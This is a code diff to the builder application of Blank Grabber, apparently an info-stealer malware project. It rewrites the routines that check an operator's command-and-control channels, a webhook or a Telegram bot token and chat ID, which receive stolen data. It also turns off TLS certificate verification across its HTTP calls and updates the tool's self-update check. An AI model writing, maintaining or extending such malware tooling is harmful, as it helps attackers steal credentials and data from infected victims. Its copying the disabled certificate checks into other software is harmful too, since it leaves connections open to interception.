@@ -14,8 +14,8 @@ from tkinter import messagebox, filedialog
 from pkg_resources import parse_version
 from socket import create_connection
 from tkinter import messagebox
-from urllib.request import urlopen, Request
-from urllib.error import HTTPError
+from urllib3 import PoolManager, disable_warnings
+disable_warnings()
 from urllib.parse import quote
 from PIL import Image
 from io import BytesIO
@@ -65,8 +65,9 @@ class Utility:
 					content = f.read()
 			
 				try:
+					http = PoolManager(cert_reqs="CERT_NONE")
 					_hash = json.loads(content)["hash"]
-					newhash = json.loads(urlopen("https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Extras/hash", timeout= 5).read().decode())["hash"]
+					newhash = json.loads(http.request("GET", "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Extras/hash", timeout= 5).data.decode())["hash"]
 
 					os.system("cls")
 					return _hash != newhash # New update available
@@ -500,6 +501,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.buildButtonControl.configure(state= "disabled")
 
 		def check():
+			http = PoolManager(cert_reqs="CERT_NONE")
 			if self.C2Mode == 0:
 				webhook = self.C2EntryControl.get().strip()
 				if len(webhook) == 0:
@@ -522,12 +524,11 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 					messagebox.showwarning("Warning", "Unable to connect to the internet!")
 					return
 				
-				data = json.dumps({"content" : "Your webhook is working!"})
-
-				req = Request(url= webhook, method= "POST", data= data.encode(), headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36"})
 
 				try:
-					status = urlopen(req).status
+					data = {"content" : "Your webhook is working!"}
+					http = http.request("POST", webhook, fields= data, headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36"})
+					status = http.status
 					if status == 204:
 						messagebox.showinfo("Success", "Your webhook seems to be working!")
 					else:
@@ -535,7 +536,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 				except Exception:
 					messagebox.showwarning("Warning", "Unable to connect to the webhook!")
 			
-			if self.C2Mode == 1:
+			elif self.C2Mode == 1:
 				endpoint = self.C2EntryControl.get().strip()
 				if len(endpoint) == 0:
 					messagebox.showerror("Error", "Endpoint cannot be empty!")
@@ -557,14 +558,14 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 				if token:
 					try:
-						resp = json.loads(urlopen("https://api.telegram.org/bot%s/getUpdates" % token).read().decode())
+						resp = json.loads(http.request("GET", "https://api.telegram.org/bot%s/getUpdates" % token).data.decode())
 						if not resp["ok"]:
 							messagebox.showerror("Error", "Invalid bot token!")
 							return
-					except HTTPError as e:
-						if e.code == 401:
-							messagebox.showerror("Error", "Invalid bot token!")
-							return
+					except Exception as e:
+						print(e)
+						messagebox.showerror("Error", "Unable to connect to the Telegram API!")
+						return
 				else:
 					messagebox.showerror("Error", "Bot token cannot be empty!")
 					return
@@ -575,7 +576,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 						return
 					else:
 						try:
-							resp = json.loads(urlopen("https://api.telegram.org/bot%s/getChat?chat_id=%s" % (token, chat_id)).read().decode())
+							resp = json.loads(http.request("GET", "https://api.telegram.org/bot%s/getChat?chat_id=%s" % (token, chat_id)).data.decode())
 							if not resp["ok"]:
 								messagebox.showerror("Error", "Invalid chat ID!\n\nCommon fixes:\n\n1) If the chat ID is of a user, then make sure the user have has sent at least one message to the bot.\n2) If the chat ID is of a channel, then make sure you have has sent at least one message in the channel after the bot joined.\n3) If the chat ID is of a group, then make sure the bot is a member of the group.")
 								return
@@ -585,10 +586,10 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 										messagebox.showerror("Error", "The bot does not have the required permissions to send files and messages to the chat!")
 										return
 
-						except HTTPError as e:
-							if e.code in (400, 403):
-								messagebox.showerror("Error", "Invalid chat ID!\n\nCommon fixes:\n\n1) If the chat ID is of a user, then make sure the user have has sent at least one message to the bot.\n2) If the chat ID is of a channel, then make sure you have has sent at least one message in the channel after the bot joined.\n3) If the chat ID is of a group, then make sure the bot is a member of the group.")
-								return
+						except Exception as e:
+							print(e)
+							messagebox.showerror("Error", "Unable to connect to the Telegram API!")
+							return
 				else:
 					messagebox.showerror("Error", "Chat ID cannot be empty!")
 					return
@@ -598,7 +599,8 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 					return
 				
 				try:
-					if urlopen("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s" % (token, chat_id, quote("Your endpoint is working!"))).status == 200:
+					http = PoolManager(cert_reqs="CERT_NONE")
+					if http.request("GET", "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s" % (token, chat_id, quote("Your endpoint is working!"))).status == 200:
 						messagebox.showinfo("Success", "Your endpoint seems to be working!")
 						return
 				except Exception as e:
